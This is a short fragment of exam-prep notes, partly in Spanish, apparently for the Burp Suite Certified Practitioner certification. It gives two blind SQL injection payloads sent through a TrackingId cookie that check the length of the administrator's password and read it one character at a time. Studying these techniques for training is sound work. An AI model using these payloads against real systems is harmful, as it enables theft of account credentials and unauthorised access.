...
```js
TrackingId=ValueCookie' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```
...
```js
TrackingId=ValueCookie' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```
...
### Tips utiles examen Practica BSCP SQLi postgreSQL -> 
